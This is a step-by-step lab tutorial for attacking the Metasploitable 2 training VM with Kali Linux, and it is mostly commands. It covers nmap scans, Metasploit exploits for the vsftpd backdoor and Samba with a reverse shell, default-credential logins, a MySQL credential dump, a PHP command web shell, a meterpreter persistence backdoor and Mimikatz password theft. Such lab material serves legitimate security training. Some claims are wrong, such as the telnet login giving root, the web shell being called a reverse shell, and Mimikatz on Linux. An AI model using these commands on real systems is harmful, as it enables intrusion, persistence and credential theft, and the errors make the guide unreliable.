## **Full Guide: Exploiting Vulnerabilities in Metasploitable 2 Using Kali Linux**
Metasploitable 2 is a **deliberately vulnerable** Linux machine used for **penetration testing** and **ethical hacking**. This guide walks you through the **proper process** of exploiting it using **Kali Linux** and **Metasploit**.

---

## **📌 Step 1: Set Up Your Lab**
1. **Install & Run Metasploitable 2**  
   - Download it from [Rapid7](https://sourceforge.net/projects/metasploitable/)
   - Run it in **VMware** or **VirtualBox**
   - Check its IP using:
     ```bash
     ifconfig
     ```
2. **Ensure Your Kali Linux Is Ready**  
   - Run Kali Linux in another VM
   - Update Metasploit:
     ```bash
     msfupdate
     ```

---

## **📌 Step 2: Scan for Open Ports & Services**
### ✅ **Nmap Scan for Vulnerabilities**
```bash
nmap -sS -sV -O -A 192.168.1.100
```
- `-sS` → Stealth scan  
- `-sV` → Service version detection  
- `-O` → OS detection  
- `-A` → Aggressive scan  

### 🔍 **Common Vulnerabilities in Metasploitable**
| **Port** | **Service** | **Vulnerability** |
|----------|------------|-------------------|
| 21       | FTP        | Anonymous login |
| 22       | SSH        | Weak credentials |
| 23       | Telnet     | Default password |
| 25       | SMTP       | User enumeration |
| 80       | Apache     | PHPMyAdmin exploit |
| 139,445  | SMB        | Samba RCE |
| 3306     | MySQL      | Weak passwords |
| 5432     | PostgreSQL | Unauthenticated access |

---

## **📌 Step 3: Exploit Common Vulnerabilities**
### 🚀 **1. Exploit vsftpd 2.3.4 Backdoor (Port 21)**
**Vulnerable Service**: `vsftpd 2.3.4` (Backdoor Command Execution)

#### **Step 1: Check for Vulnerability**
```bash
nmap --script ftp-vuln* -p 21 192.168.1.100
```

#### **Step 2: Exploit Using Metasploit**
```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
set PAYLOAD cmd/unix/interact
exploit
```
✅ **Root Shell Access!** Use:
```bash
whoami
```

---

### 🚀 **2. Exploit Samba (Port 139/445)**
**Vulnerable Service**: Samba **(Unrealistic permissions, allows Remote Code Execution)**

#### **Step 1: Check Samba Version**
```bash
smbclient -L //192.168.1.100
```

#### **Step 2: Exploit Using Metasploit**
```bash
msfconsole
search usermap_script
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.1.100
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.1.50  # Your Kali IP
set LPORT 4444
exploit
```
✅ **Root Shell Access!** Use:
```bash
id
```

---

### 🚀 **3. Exploit Telnet Default Credentials (Port 23)**
**Vulnerable Service**: Telnet **(Default password: `msfadmin:msfadmin`)**

#### **Step 1: Connect to Telnet**
```bash
telnet 192.168.1.100
```
When prompted:
- **Username:** `msfadmin`
- **Password:** `msfadmin`

✅ **Root Access!** Type:
```bash
whoami
```

---

### 🚀 **4. Exploit MySQL (Port 3306)**
**Vulnerable Service**: MySQL **(Weak Passwords)**

#### **Step 1: Test for Weak Credentials**
```bash
mysql -u root -h 192.168.1.100 -p
```
Try common passwords like:
- `root`
- `toor`
- `password`

#### **Step 2: Exploit Using Metasploit**
```bash
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASSWORD root
exploit
```
✅ **Database Access!** Dump user credentials:
```bash
show databases;
use mysql;
select * from user;
```

---

### 🚀 **5. Exploit PHPMyAdmin (Port 80)**
**Vulnerable Service**: PHPMyAdmin **(Remote Code Execution)**

#### **Step 1: Check for Web Exploits**
```bash
nikto -h 192.168.1.100
```

#### **Step 2: Access PHPMyAdmin**
- Open **`http://192.168.1.100/phpmyadmin/`**  
- Use default credentials:  
  - **Username:** `root`
  - **Password:** `root`

#### **Step 3: Run Reverse Shell**
Upload a PHP reverse shell:
```php
<?php
$cmd = $_GET['cmd'];
system($cmd);
?>
```
Save as `shell.php`, upload it, then execute:
```bash
http://192.168.1.100/phpmyadmin/shell.php?cmd=whoami
```

✅ **Root Access!**

---

## **📌 Step 4: Post-Exploitation**
Once inside, gain **persistence**.

### ✅ **Create a Backdoor**
```bash
meterpreter > run persistence -U -i 5 -p 4444 -r 192.168.1.50
```

### ✅ **Steal Passwords**
Use **Mimikatz** if the system supports it:
```bash
load mimikatz
mimikatz_command -f "privilege::debug sekurlsa::logonpasswords"
```
✅ **Scanned Metasploitable 2 for open ports**  
✅ **Exploited vulnerabilities using Metasploit**  
✅ **Gained shell access & performed post-exploitation**  
